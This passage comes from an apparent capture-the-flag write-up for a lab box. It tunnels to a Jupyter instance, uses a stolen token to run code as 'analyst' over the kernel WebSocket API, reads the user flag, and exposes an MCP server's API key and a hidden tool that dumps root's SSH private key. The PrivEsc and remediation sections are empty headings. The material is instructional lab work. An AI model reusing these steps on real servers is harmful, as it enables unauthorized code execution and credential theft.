- `-L 18888:127.0.0.1:8888` — Forward local port 18888 to `127.0.0.1:8888` on the remote host (Jupyter). Local port 18888 is chosen to avoid conflicts with any local Jupyter instance.
- `-L 15000:127.0.0.1:5000` — Forward local port 15000 to `127.0.0.1:5000` on the remote host (OPSMCP Flask).
- `-N` — Do not execute a remote command — just maintain the tunnel.
- `-f` — Fork to background after authenticating, leaving the terminal free.

**Result:**
```shell
kali@kali:~$ ssh -i devhub_key \
  -L 18888:127.0.0.1:8888 \
  -L 15000:127.0.0.1:5000 \
  mcp-dev@10.129.245.216 -N -f
[Process backgrounded]
```

Tunnel verification:

```shell
kali@kali:~$ curl -s http://localhost:18888/api
{"version": "2.17.0"}

kali@kali:~$ curl -s http://localhost:15000/health
{"status":"healthy","uptime":"14d 3h 22m"}
```

Both services are now accessible locally on the attacker machine.

### 4.4 Jupyter Code Execution as `analyst`

With the Jupyter token and a local tunnel established, the Jupyter REST API was used to spawn a kernel and execute Python code in the context of the `analyst` user.

**Theory Block — Jupyter Kernel Code Execution:**
Jupyter's REST API allows creating compute kernels and then communicating with them via WebSocket using the Jupyter messaging protocol. A kernel is an isolated Python interpreter process owned by the user who launched Jupyter (in this case, `analyst`). By creating a kernel and sending `execute_request` messages over the WebSocket, any code executed runs as `analyst` — including reading files owned by that user and those readable by `analyst`'s group.

**Step 1 — Create a kernel:**

**Command:** `curl -s -X POST -H "Authorization: token $TOKEN" -H "Content-Type: application/json" -d '{"name":"python3"}' http://localhost:18888/api/kernels`

**Breakdown:**
- `Authorization: token $TOKEN` — Jupyter's token-based authentication; the token is prepended with `token ` per the protocol.
- `-d '{"name":"python3"}'` — Request a Python 3 kernel (the only available kernel on this system).

**Result:**
```shell
{"id": "c5597c34-93d8-4885-bed9-b33404eec5ab", "name": "python3",
 "last_activity": "2026-06-06T12:25:06.120753Z", "execution_state": "starting", "connections": 0}
```

Kernel ID: `c5597c34-93d8-4885-bed9-b33404eec5ab`

**Step 2 — Execute code via WebSocket:**

A Python script using `websocket-client` was written to connect to the kernel WebSocket endpoint, send an `execute_request` message, and collect the `stream` output:

```python
import json, uuid, time, threading, websocket

TOKEN     = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "c5597c34-93d8-4885-bed9-b33404eec5ab"

CODE = """
import os
print("=== id ===")
print(os.popen("id").read().strip())

print("\\n=== USER FLAG ===")
try:
    print(open('/home/analyst/user.txt').read().strip())
except Exception as e:
    print(f"ERROR: {e}")

print("\\n=== /opt/opsmcp/server.py ===")
try:
    print(open('/opt/opsmcp/server.py').read())
except Exception as e:
    print(f"ERROR: {e}")
"""
```

**Command:** `python3 /home/kali/DevHub/jupyter_exec.py`

**Result:**
```shell
=== id ===
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)

=== USER FLAG ===
c442f5299f0ae6dee0346e40b279f5ae

=== /opt/opsmcp/server.py ===
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
"""
...
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
...
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    ...
}
...
    elif tool_name == "ops._admin_dump":
        if target == "ssh_keys":
            with open('/root/.ssh/id_rsa', 'r') as f:
                key_data = f.read()
            return jsonify({
                "root_private_key": key_data,
                ...
            })
```

**Key finding:** User flag captured. The OPSMCP source code reveals:
- `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"` — the authentication credential.
- A hidden tool `ops._admin_dump` that is not included in `/tools/list` but is callable via `/tools/call`.
- When called with `target="ssh_keys"` and `confirm=true`, it reads and returns `/root/.ssh/id_rsa`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

